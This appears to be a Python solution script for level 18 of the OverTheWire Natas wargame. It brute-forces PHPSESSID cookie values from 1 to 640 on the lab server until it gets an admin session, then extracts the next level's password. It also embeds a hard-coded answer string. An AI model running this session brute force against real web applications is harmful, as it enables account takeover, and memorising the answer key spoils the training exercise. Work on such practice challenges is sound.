import requests

import natas17
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
    url = "http://natas18.natas.labs.overthewire.org"
    username = "natas18"
    if not password:
        password = natas17.solution()

    # The source code shows that the app is assigning a random integer
    # from 1 to 640 and assigning it to a "PHPSESSID" cookie.

    s = requests.Session()
    auth = (username, password)
    data = {"username": "natas18", "password": "natas18"}
    r = s.post(url, auth=auth, data=data)
    max_id = 640
    for id in range(1, max_id):
        s.cookies["PHPSESSID"] = str(id)
        r = s.post(url, auth=auth, data=data)
        if "You are an admin." in r.text:
            start = "Password: "
            end = "</pre><div id"
            natas19_password = between(r.text, start, end)
            return natas19_password
